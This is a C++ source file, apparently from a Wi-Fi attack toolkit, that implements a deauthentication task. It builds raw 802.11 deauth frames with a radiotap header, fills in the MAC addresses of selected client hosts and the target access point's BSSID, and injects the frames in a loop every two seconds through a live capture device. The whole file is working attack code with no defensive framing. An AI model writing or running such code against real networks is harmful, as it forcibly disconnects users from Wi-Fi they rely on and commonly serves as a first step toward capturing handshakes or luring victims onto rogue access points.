//
// Created by dev on 7/23/25.
//

#include "deauth-packet-sending.hpp"

ashk::tasks::DeauthPacketSendingTask::DeauthPacketSendingTask(pcpp::PcapLiveDevice *dev, std::string iface_name_or_ip,
                                                              WifiAp &wifi_ap,
                                                              std::vector<std::shared_ptr<WifiHost>> &host_list,
                                                              int last_task_id) :
        dev_(dev),
        wifi_ap(&wifi_ap),
        iface_name_or_ip(iface_name_or_ip),
        Task(last_task_id),host_list(&host_list){

}

std::string ashk::tasks::DeauthPacketSendingTask::get_data(ashk::tasks_data_id data_id) {
    return std::string();
}

void ashk::tasks::DeauthPacketSendingTask::exec() {
    logger.log("starting sending deauth packets . . .\n");
    dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIpOrName(iface_name_or_ip);
    if (dev_ == nullptr) {
        logger.log("couldn't find device\n");
        return;
    }
    if (!dev_->open()) {
        logger.log("couldn't open device");
        return;
    }

    uint8_t packet[]={
            // --- Radiotap Header ---
            0x00, 0x00,             // Radiotap version + pad
            0x0c, 0x00,             // Radiotap length = 12 bytes
            0x04, 0x80, 0x00, 0x00, // Present flags (Rate + TX Flags)
            0x02,                   // Rate: 1 Mbps
            0x00,                   // Padding
            0x00, 0x00,             // TX Flags

            // --- 802.11 Header ---
            0xc0, 0x00,             // Frame Control: Deauth
            0x00, 0x00,             // Duration

            // Addr1 (Target Client)
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,

            // Addr2 (AP)
            0x00, 0x11, 0x22, 0x33, 0x44, 0x55,

            // Addr3 (BSSID)
            0x00, 0x11, 0x22, 0x33, 0x44, 0x55,

            0x00, 0x00,             // Sequence Control

            // Frame body: Reason Code
            0x07, 0x00              // Reason code = 7 (class 3 error)
    };






    while (is_running()) {
        std::vector<pcpp::Packet>packets;
        for(auto i : *host_list){
            if(i->is_selected){
                auto pkt = new uint8_t[sizeof(packet)];
                memcpy(pkt, packet, sizeof(packet));

                memcpy(pkt + 16, i->mac.getRawData(), 6);
                memcpy(pkt + 22, wifi_ap->b_ssid.getRawData(), 6);
                memcpy(pkt + 28, wifi_ap->b_ssid.getRawData(), 6);

                auto rawPacket=new pcpp::RawPacket(pkt, sizeof(packet), timeval{0, 0}, false);
                packets.emplace_back(rawPacket);

            }
        }
        for (auto &i:packets) {
            dev_->sendPacket(&i);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    }

    end();
    logger.log("stopped sending deauth packets\n");
}

